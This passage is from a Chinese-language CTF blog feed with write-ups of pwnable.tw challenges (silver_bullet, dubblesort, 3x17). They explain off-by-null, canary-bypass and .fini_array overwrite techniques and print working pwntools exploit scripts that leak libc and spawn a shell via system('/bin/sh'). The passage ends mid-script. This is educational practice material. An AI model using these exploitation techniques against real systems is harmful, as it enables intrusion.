+然而在复制字符串时，<code class="language-plaintext highlighter-rouge">strncat</code>不仅会把 <code class="language-plaintext highlighter-rouge">description[0x2f]</code> 覆盖成该字符，还会把后面的 <code class="language-plaintext highlighter-rouge">description[0x30]</code> 修改成 <code class="language-plaintext highlighter-rouge">\0</code>。</p>
+
+<p>也就是说，虽说 <code class="language-plaintext highlighter-rouge">strncat</code> 有一个大小限制 $n$ 的参数，但这个 $n$ <strong>并不能保证参数中的 <code class="language-plaintext highlighter-rouge">dest</code> 字符串只有 $n$ 个字符被修改</strong>，而是指<strong>参数中的 <code class="language-plaintext highlighter-rouge">src</code> 字符串至多有多长</strong>！
+在本题中，程序并没有考虑到这一点，因此可以把正好位于 <code class="language-plaintext highlighter-rouge">description[0x30]</code> 的 <code class="language-plaintext highlighter-rouge">power</code> 最低位覆盖为 <code class="language-plaintext highlighter-rouge">\0</code>。如此一来，在下一次 <code class="language-plaintext highlighter-rouge">power_up</code> 时，我们就可以从 <code class="language-plaintext highlighter-rouge">power</code> 这个变量开始，输入 0x30 个字符，达成栈溢出攻击。</p>
+
+<h2 id="利用">利用</h2>
+
+<p>由于只能一次输入，因此我选择泄露libc的 <code class="language-plaintext highlighter-rouge">puts</code> 之后(打败boss来正常return)，调用 <code class="language-plaintext highlighter-rouge">_start</code> 重开，在新的一轮中再实施攻击，拿到shell。</p>
+
+<p>exp:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span><span class="o">=</span><span class="s">'i386'</span>
+<span class="c1"># context.log_level='debug'
+</span>
+<span class="n">filename</span><span class="o">=</span><span class="s">"./silver_bullet"</span>
+<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="n">filename</span><span class="p">],</span> <span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s">"LD_PRELOAD"</span><span class="p">:</span><span class="s">"./libc_32.so.6"</span><span class="p">})</span>
+<span class="n">elf</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
+
+<span class="n">libc_name</span><span class="o">=</span><span class="s">"./libc_32.so.6"</span>
+<span class="n">libc</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="n">libc_name</span><span class="p">)</span>
+
+<span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"chall.pwnable.tw"</span><span class="p">,</span> <span class="mi">10103</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">dbg</span><span class="p">():</span>
+    <span class="n">g</span> <span class="o">=</span> <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">rop</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'1'</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\xff</span><span class="s">'</span><span class="o">*</span><span class="mi">47</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
+
+    <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'2'</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\xff</span><span class="s">'</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
+
+    <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'2'</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\xff</span><span class="s">'</span><span class="o">*</span><span class="mi">7</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span> <span class="c1"># 之所以这里是7而不是8，因为在strncat的时候power最低位已经有值了，所以只需要用3个字符填充power，4个字符填充saved rbp
+</span>    <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
+
+    <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'3'</span><span class="p">)</span>
+
+<span class="c1"># leak libc
+</span><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">''</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="s">'puts'</span><span class="p">])</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'_start'</span><span class="p">])</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'puts'</span><span class="p">])</span>
+
+<span class="n">rop</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">mes</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recvrepeat</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+<span class="n">pos</span> <span class="o">=</span> <span class="n">mes</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="sa">b</span><span class="s">'You win !!</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span> <span class="o">+</span> <span class="nb">len</span><span class="p">(</span><span class="s">'You win !!</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+<span class="n">libc_base</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">mes</span><span class="p">[</span><span class="n">pos</span><span class="p">:</span><span class="n">pos</span><span class="o">+</span><span class="mi">4</span><span class="p">])</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
+
+<span class="c1"># system('/bin/sh')
+</span><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">''</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">])</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">])</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x00158e8b</span><span class="p">)</span> <span class="c1"># "/bin/sh"
+</span>
+<span class="n">rop</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>]]></content><author><name></name></author><summary type="html"><![CDATA[Off-by-NULL]]></summary></entry><entry><title type="html">pwnable.tw dubblesort</title><link href="http://localhost:4001/2022/08/06/pwnable-tw-dubblesort-writeup.html" rel="alternate" type="text/html" title="pwnable.tw dubblesort" /><published>2022-08-06T15:49:02+08:00</published><updated>2022-08-06T15:49:02+08:00</updated><id>http://localhost:4001/2022/08/06/pwnable-tw-dubblesort-writeup</id><content type="html" xml:base="http://localhost:4001/2022/08/06/pwnable-tw-dubblesort-writeup.html"><![CDATA[<p>难度不大的一关，而且网上有比我的做法更简单（但具有技巧性）的做法。
+但是还是做了好久好久……不是耗在题目上，主要是耗在搞libc版本上。</p>
+
+<h2 id="题目">题目</h2>
+
+<p>保护全开的i386程序。
+首先提示输入姓名，用read读取，并用 <code class="language-plaintext highlighter-rouge">printf("...%s...", buf)</code> 打印出来（这种形式没办法利用格式化字符串漏洞）。
+然后提示输入数组大小和数据，在循环中用 <code class="language-plaintext highlighter-rouge">scanf("%u", a[i])</code> 读取，数组大小无极限（但循环变量用寄存器表示，无法跳过某地址读写）。
+最后<strong>对数组进行冒泡排序</strong>，并将排序后的数组一个一个输出。</p>
+
+<!-- more -->
+
+<p>本题有两个漏洞：</p>
+
+<ol>
+  <li>read读取数据时不会自动补上 <code class="language-plaintext highlighter-rouge">\0</code>，所以打印的时候可以泄露一些栈上的数据。（但由于大小控制良好，无法栈溢出，无法泄露canary）</li>
+  <li>数组大小无极限，可以进行栈溢出。</li>
+</ol>
+
+<p>问题主要是：</p>
+
+<ol>
+  <li>栈上有哪些数据可供泄露？</li>
+  <li>如何应对canary？</li>
+  <li>如何让我的gadget在经过排序后仍旧待在正确的位置？</li>
+</ol>
+
+<h3 id="第一个问题泄露数据">第一个问题：泄露数据</h3>
+
+<p>由于这是俺第一次做提供了libc的题目，我前前后后摸索了很久。</p>
+
+<p>本题栈上数据有很多，我选择泄露libc里的一个地址。
+本地环境下，这个地址是GOT，然而在线环境下同一个位置的值变了，好在仍然是libc里的某地址，现场计算一下偏移仍然可以用：</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvS</span><span class="p">())</span>
+<span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mi">4</span><span class="o">*</span><span class="mi">7</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x01</span><span class="s">'</span><span class="p">)</span>
+<span class="n">mes</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recvrepeat</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">libc_base</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">mes</span><span class="p">[</span><span class="mi">34</span><span class="p">:</span><span class="mi">34</span><span class="o">+</span><span class="mi">4</span><span class="p">])</span><span class="o">-</span><span class="mh">0x1</span> <span class="o">-</span> <span class="n">libc_offset</span>
+<span class="k">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+</code></pre></div></div>
+
+<h3 id="第二个问题如何应对canary">第二个问题：如何应对canary</h3>
+
+<p>看网上大佬的wp，可以利用单个的”+”或者”-“来欺骗 <code class="language-plaintext highlighter-rouge">scanf("%u", a[i])</code> ，引发“读取成功但读个寂寞”的效果，这是因为scanf会将这俩当作数字的正负号来对待。
+这是一个技巧性很强的trick，我没有想到。我的方法是在读取数据循环到canary的位置的时候，输入一个任意非数字字符串（”stop”），由于程序没有写清空输入流的操作，所以包括该scanf之内的所有后续scanf都会跳过，引发“读取失败且读个寂寞”效果。</p>
+
+<p>采用这种方法，就可以在保留canary在栈上的情况下，通过之后的冒泡排序，将比canary大的数据移动到canary之后。
+但是缺点是canary之后的数据无法覆盖，只能想办法应付。</p>
+
+<h3 id="第三个问题如何应对利用冒泡排序">第三个问题：如何应对/利用冒泡排序</h3>
+
+<p>本题的冒泡排序将大的数字移到上边（地址高位），小的数据移到下面。
+采用上述的应对canary方法，有一些数据是无法进行覆盖的，排序的时候必须考虑这些已有数据。</p>
+
+<pre><code class="language-gdb">pwndbg&gt; stack 50
+00:0000│ esp 0xffffce30 —▸ 0xffffce4c ◂— 0x1
+01:0004│     0xffffce34 ◂— 0x1
+02:0008│     0xffffce38 ◂— 0x0
+03:000c│     0xffffce3c —▸ 0xf7ffdc08 —▸ 0xf7fd7000 ◂— jg     0xf7fd7047
+04:0010│     0xffffce40 —▸ 0xf7ffcd00 (_rtld_global_ro) ◂— 0x0
+05:0014│     0xffffce44 —▸ 0xffffcf6c —▸ 0xffffd184 ◂— 'HTTP_PROXY=http://192.168.21.1:7890/'
+06:0018│     0xffffce48 ◂— 0x1
+（以下为数组开始处）
+07:001c│     0xffffce4c ◂— 0x1
+08:0020│ edi 0xffffce50 —▸ 0xf7ffddd8 —▸ 0xf7ffdd64 —▸ 0xf7ffdc1c —▸ 0xf7ffdc08 ◂— ...
+09:0024│     0xffffce54 —▸ 0xffffcea0 ◂— 0x1
+0a:0028│     0xffffce58 ◂— 0x0
+... ↓        2 skipped
+0d:0034│     0xffffce64 —▸ 0xffffd151 ◂— '/home/nss/Desktop/pwnable.tw/dubblesort/dubblesort'
+0e:0038│     0xffffce68 —▸ 0xf7fcd000 ◂— 0x1afdb0
+0f:003c│     0xffffce6c ◂— 0x6b63614a ('Jack')
+10:0040│     0xffffce70 —▸ 0xffff0a79 ◂— 0x0
+11:0044│     0xffffce74 ◂— 0x2f /* '/' */
+12:0048│     0xffffce78 ◂— 0x50 /* 'P' */
+13:004c│     0xffffce7c —▸ 0xf7eac82f ◂— add    edi, 0x1207d1
+14:0050│     0xffffce80 ◂— 0x1
+15:0054│     0xffffce84 ◂— 0x8000
+16:0058│     0xffffce88 —▸ 0xf7fcd000 ◂— 0x1afdb0
+17:005c│     0xffffce8c —▸ 0x56555601 ◂— add    ebx, 0x199f
+18:0060│     0xffffce90 —▸ 0x565557a9 ◂— add    ebx, 0x17f7
+19:0064│     0xffffce94 —▸ 0x56556fa0 ◂— 0x1ea8
+1a:0068│     0xffffce98 ◂— 0x1
+1b:006c│     0xffffce9c —▸ 0x56555b72 ◂— add    edi, 1
+1c:0070│     0xffffcea0 ◂— 0x1
+1d:0074│     0xffffcea4 —▸ 0xffffcf64 —▸ 0xffffd151 ◂— '/home/nss/Desktop/pwnable.tw/dubblesort/dubblesort'
+1e:0078│     0xffffcea8 —▸ 0xffffcf6c —▸ 0xffffd184 ◂— 'HTTP_PROXY=http://192.168.21.1:7890/'
+（以下为canary以及无法覆盖的数据）
+1f:007c│     0xffffceac ◂— 0xadd66300
+20:0080│     0xffffceb0 —▸ 0xf7fcd3dc —▸ 0xf7fce1e0 ◂— 0x0
+21:0084│     0xffffceb4 —▸ 0xffffd14b ◂— 'i686'
+22:0088│     0xffffceb8 —▸ 0x56555b2b ◂— add    ebx, 0x1475
+23:008c│     0xffffcebc ◂— 0x0
+24:0090│     0xffffcec0 —▸ 0xf7fcd000 ◂— 0x1afdb0
+25:0094│     0xffffcec4 —▸ 0xf7fcd000 ◂— 0x1afdb0
+26:0098│ ebp 0xffffcec8 ◂— 0x0
+27:009c│     0xffffcecc —▸ 0xf7e35637 (__libc_start_main+247) ◂— add    esp, 0x10
+28:00a0│     0xffffced0 ◂— 0x1
+29:00a4│     0xffffced4 —▸ 0xffffcf64 —▸ 0xffffd151 ◂— '/home/nss/Desktop/pwnable.tw/dubblesort/dubblesort'
+2a:00a8│     0xffffced8 —▸ 0xffffcf6c —▸ 0xffffd184 ◂— 'HTTP_PROXY=http://192.168.21.1:7890/'
+2b:00ac│     0xffffcedc ◂— 0x0
+... ↓        2 skipped
+2e:00b8│     0xffffcee8 —▸ 0xf7fcd000 ◂— 0x1afdb0
+2f:00bc│     0xffffceec —▸ 0xf7ffdc04 ◂— 0x0
+30:00c0│     0xffffcef0 ◂— 0x1
+31:00c4│     0xffffcef4 ◂— 0x0
+</code></pre>
+
+<p>我把（栈上的）数据由小到大分为5类：</p>
+
+<ol>
+  <li>极小值：0或1</li>
+  <li>代码段：0x56xxxxxx</li>
+  <li>canary：随机，但可以假设大小在该位置</li>
+  <li>libc代码地址：0xf7xxxxxx，比如 <code class="language-plaintext highlighter-rouge">__libc_start_main</code></li>
+  <li>极大值：libc的got及以上的地址。（libc的RW段、程序的栈地址等）</li>
+</ol>
+
+<p>而ROP用到的gadget地址（<code class="language-plaintext highlighter-rouge">system</code> 和 <code class="language-plaintext highlighter-rouge">"/bin/sh"</code>）都位于4、5中间，也就是大于 <code class="language-plaintext highlighter-rouge">__libc_start_main</code>，小于libc的got。</p>
+
+<p>简单思考一下：极大值一定会排在最后，因此我们要达到的效果是（注意32位函数调用规则，地址后面是返回地址，然后才是函数参数）：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>esp+0x1c | 0, 1......
+...
+esp+0x78 | 0x56xxxxxxxx
+esp+0x7c | canary
+esp+0x80 | libc_start_main or libc_base or whatever （I just used system）
+...
+ebp+0x04 | system
+ebp+0x08 | system(ret_addr)
+ebp+0x0c | "/bin/sh\x00"
+esp+0x10 | big value like libc_got
+...
+</code></pre></div></div>
+
+<p>按照这个效果，进行一下不可控数据中极大值和极小值的配平（过程略），就可以计算出需要输入哪些数据。
+exp脚本如下：</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span><span class="o">=</span><span class="s">'i386'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">log_level</span><span class="o">=</span><span class="s">'debug'</span>
+
+<span class="n">filename</span><span class="o">=</span><span class="s">"./dubblesort"</span>
+<span class="c1"># io = process([filename], env={"LD_PRELOAD":"./libc_32.so.6"})
+</span><span class="n">elf</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
+
+<span class="n">libc_name</span><span class="o">=</span><span class="s">"./libc_32.so.6"</span>
+<span class="n">libc</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="n">libc_name</span><span class="p">)</span>
+
+<span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'chall.pwnable.tw'</span><span class="p">,</span> <span class="mi">10101</span><span class="p">)</span>
+
+<span class="c1"># g = gdb.attach(io, """b *main+245
+# commands
+#  stack 50
+# end""")
+</span>
+<span class="k">def</span> <span class="nf">send_d</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+ <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">": "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">).</span><span class="n">encode</span><span class="p">(</span><span class="s">'ascii'</span><span class="p">))</span>
+
+<span class="n">libc_offset</span> <span class="o">=</span> <span class="mh">0x1b0000</span> <span class="o">-</span> <span class="mh">0x1e00</span>
+<span class="n">sys_offset</span> <span class="o">=</span> <span class="mh">0x3a940</span>
+<span class="n">sh_str_offset</span> <span class="o">=</span> <span class="mh">0x158e8b</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvS</span><span class="p">())</span>
+<span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mi">4</span><span class="o">*</span><span class="mi">7</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x01</span><span class="s">'</span><span class="p">)</span>
+<span class="n">mes</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recvrepeat</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">libc_base</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">mes</span><span class="p">[</span><span class="mi">34</span><span class="p">:</span><span class="mi">34</span><span class="o">+</span><span class="mi">4</span><span class="p">])</span><span class="o">-</span><span class="mh">0x1</span> <span class="o">-</span> <span class="n">libc_offset</span>
+<span class="k">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+
+<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'43'</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">15</span><span class="p">):</span>
+ <span class="n">send_d</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">8</span><span class="p">):</span>
+ <span class="n">send_d</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">sys_offset</span><span class="p">)</span>
+<span class="n">send_d</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">sh_str_offset</span><span class="p">)</span>
+<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">": "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"stop"</span><span class="p">)</span>
+
+<span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>]]></content><author><name></name></author><summary type="html"><![CDATA[难度不大的一关，而且网上有比我的做法更简单（但具有技巧性）的做法。 但是还是做了好久好久……不是耗在题目上，主要是耗在搞libc版本上。]]></summary></entry><entry><title type="html">pwnable.tw 3x17</title><link href="http://localhost:4001/2022/08/04/pwnable-tw-3x17-writeup.html" rel="alternate" type="text/html" title="pwnable.tw 3x17" /><published>2022-08-04T04:17:00+08:00</published><updated>2022-08-04T04:17:00+08:00</updated><id>http://localhost:4001/2022/08/04/pwnable-tw-3x17-writeup</id><content type="html" xml:base="http://localhost:4001/2022/08/04/pwnable-tw-3x17-writeup.html"><![CDATA[<p>好难的一关，顺着这关学了好多东西……</p>
+
+<h2 id="part0-符号名呢">Part0 符号名呢</h2>
+
+<h3 id="摸索">摸索</h3>
+
+<p>本题是一个strip后的静态链接文件……
+当我打开IDA，我看不到任何一个函数名，只有一大堆地址迎接我。
+于是我在libc里耗了一天，成果只是大致知道执行了哪些函数，并且给 <code class="language-plaintext highlighter-rouge">read</code>、<code class="language-plaintext highlighter-rouge">write</code> 等库函数标了名称。</p>
+
+<p>然后我想了一个方法，我是不是可以根据函数的地址来看出这是哪一个libc版本，然后就可以给每个函数都标上名称了？然而不行。
+静态链接不像动态链接，它只把用到了的函数链接进文件，因此库函数的地址和它在库中的位置毫无关系。</p>
+
+<p>然后当天晚上做梦的时候，我梦到真的有这么一个库，我一把库拖进IDA PRO，软件自动给所有的函数都标上了名字。
+醒来的时候我一想，会不会真有根据函数特征来识别函数名的功能？拿起枕边手机一查就查到了。（话说你不能早点查吗）</p>
+
+<h3 id="解决">解决</h3>
+
+<p>参考<a href="https://blog.csdn.net/qq_29343201/article/details/74656456">利用ida pro的flare功能识别静态链接函数签名_Anciety的博客</a></p>
+
+<p>IDA支持给特定库生成一个签名，然后用这个签名识别库函数的名称！
+有人已经生成过很多签名了，可以直接去<a href="https://github.com/push0ebp/sig-database">push0ebp/sig-database: IDA FLIRT Signature Database (github.com)</a>下载。</p>
+
+<p>那么问题来了，下哪个libc版本呢？
+pwnable.tw的官网首页说，题目都运行在ubuntu16.04或18.04上，所以我先去把这两个系统对应的libc都下了下来，发现只识别了五十几个库函数……
+然后又下了一大堆libc版本，最后在19.04里找到的libc6_2.28成功匹配到了六百多个库函数。</p>
+
+<p>于是我终于知道哪个是main函数了……然后发现离成功还尚早……</p>
+
+<h2 id="part1-分析放弃">Part1 分析（<del>放弃</del>）</h2>
+
+<p>本关开启了NX和Canary，没开PIE，那么应该是可以修改某些东西的。
+main函数干了四件事：</p>
+
+<ol>
+  <li>write一个”addr:”</li>
+  <li>read一个0x18长度的字符串，并用一个库函数将其转换成数字（当成10进制数）。</li>
+  <li>write一个”data:”</li>
+  <li>read一个0x18长度的字符串，地址是刚刚输入的数。</li>
+</ol>
+
+<p>然后就ret了。可以发现，我们没有任何泄露栈地址的方法，没办法进行简单的ret2xxx系列攻击。
+（然后我就放弃了，这题大概又是超出我知识水平范围的，所以去网上找writeup：<a href="https://xuanxuanblingbling.github.io/ctf/pwn/2019/09/06/317/">和媳妇一起学Pwn 之 3x17 | Clang裁缝店</a>看了）</p>
+
+<h2 id="part2-main函数的启动过程">Part2 main函数的启动过程</h2>
+
+<p>参考教程：<a href="https://blog.csdn.net/gary_ygl/article/details/8506007">linux编程之main()函数启动过程_gary_ygl的博客</a></p>
+
+<p>读了文章，学到很多姿势，尤其是对于C程序的抽象-&gt;具象：
+从一开始的程序运行过程就是 <code class="language-plaintext highlighter-rouge">main</code> 开始到结束；
+到后来知道从 <code class="language-plaintext highlighter-rouge">_start</code> 开始，它负责调用 <code class="language-plaintext highlighter-rouge">__libc_start_main()</code>，<code class="language-plaintext highlighter-rouge">__libc_start_main()</code> 再调用 <code class="language-plaintext highlighter-rouge">main()</code> 函数；
+再到现在发现 <code class="language-plaintext highlighter-rouge">__libc_start_main()</code> 干了很多事情，包括在调用 <code class="language-plaintext highlighter-rouge">main()</code> 函数之前，调用 <code class="language-plaintext highlighter-rouge">__libc_csu_init()</code> 函数，并且用 <code class="language-plaintext highlighter-rouge">_cxa_atexit()</code> 函数设置程序退出前执行 <code class="language-plaintext highlighter-rouge">__libc_csu_fini()</code> 函数（具体来说 <code class="language-plaintext highlighter-rouge">exit()</code> 调用 <code class="language-plaintext highlighter-rouge">_run_exit_handlers()</code> ，并在其中按照倒序调用之前用 <code class="language-plaintext highlighter-rouge">_cxa_atexit()</code> 注册过的函数）。并且在调用 <code class="language-plaintext highlighter-rouge">main()</code> 之后，会调用 <code class="language-plaintext highlighter-rouge">exit()</code> 函数。</p>
+
+<p>（其实还干了一些初始化以及善后工作，但是和链接比较相关，和本题不那么相关）</p>
+
+<p>而逆向本题可以看到，<code class="language-plaintext highlighter-rouge">__libc_csu_init()</code> 主要做两件事：</p>
+
+<ol>
+  <li>调用位于 <code class="language-plaintext highlighter-rouge">.init</code> 段中的 <code class="language-plaintext highlighter-rouge">_init_proc()</code></li>
+  <li>按顺序调用位于 <code class="language-plaintext highlighter-rouge">.init_array</code> 中的函数（这是一个函数指针数组）（数组大小固定，汇编中直接用立即数地址计算数组大小）</li>
+</ol>
+
+<p>类似地，<code class="language-plaintext highlighter-rouge">__libc_csu_fini()</code> 也干两件事，但是和init是正好顺序相反的：</p>
+
+<ol>
+  <li>按逆序调用位于 <code class="language-plaintext highlighter-rouge">.fini_array</code> 中的函数（这是一个函数指针数组）（数组大小固定，汇编中直接用立即数地址计算数组大小）</li>
+  <li>调用位于 <code class="language-plaintext highlighter-rouge">.fini</code> 段中的 <code class="language-plaintext highlighter-rouge">term_proc()</code></li>
+</ol>
+
+<p>然后画个图表示一下我的理解：</p>
+
+<p><img src="/images/3x17_1.jpg" alt="两个csu函数的调用顺序" /></p>
+
+<p>而 <code class="language-plaintext highlighter-rouge">.init_array</code> 和 <code class="language-plaintext highlighter-rouge">.fini_array</code> 都是rw的，可写！
+然后我决定在懂得了这些之后再自己尝试一下利用！</p>
+
+<h2 id="part3-exploitation">Part3 Exploitation</h2>
+
+<p>通过覆写一次 <code class="language-plaintext highlighter-rouge">.fini_array</code>，可以达到如图的效果。</p>
+
+<p><img src="/images/3x17_2.jpg" alt="fini&amp;main循环" /></p>
+
+<p>由于不存在wx的段，所以放弃shellcode，想想如何ROP。
+光凭 <code class="language-plaintext highlighter-rouge">.fini_array</code> 这两个call是没有用的，必须想办法stack pivot一下。</p>
+
+<p>刚开始的思路是利用</p>
+
+<pre><code class="language-asm">0x00418820: mov rax, qword [0x00000000004B7120] ; ret  ;
+0x0044f62b: xchg eax, esp ; ret  ;
+</code></pre>
+
+<p>这两个gadget来把rsp弄到我想要的地方。但是我发现这做不到，原因是 <code class="language-plaintext highlighter-rouge">.fini_array</code> 只有两个元素，我不论怎么修改这个数组，都<strong>只能实际调用一个gadget</strong>。
+原因如下：</p>
+
+<p><img src="/images/3x17_3.jpg" alt="覆盖fini_array的两种情况" /></p>
+
+<p>我们必须要用一个gadget完成stack pivot，这意味着要么有一个gadget同时涵盖了赋值+修改rsp的工作，要么利用寄存器或栈上已有的值。
+GDB动态调试到这里，发现确实有几个寄存器存着RW的位置，其中就包括rbp。然后回忆一下：<code class="language-plaintext highlighter-rouge">leave = mov rsp, rbp; pop rbp;</code> ，用这个来stack pivot。</p>
+
+<p>然后利用静态链接程序的丰富gadget库轻松写出了ROP chain，拿到了shell。</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
+<span class="n">filename</span><span class="o">=</span><span class="s">"./3x17"</span>
+<span class="c1"># io = process(["strace", filename])
+# io = process([filename])
+</span><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"chall.pwnable.tw"</span><span class="p">,</span> <span class="mi">10105</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">write</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">addr</span><span class="p">).</span><span class="n">encode</span><span class="p">(</span><span class="s">'ascii'</span><span class="p">))</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvS</span><span class="p">())</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
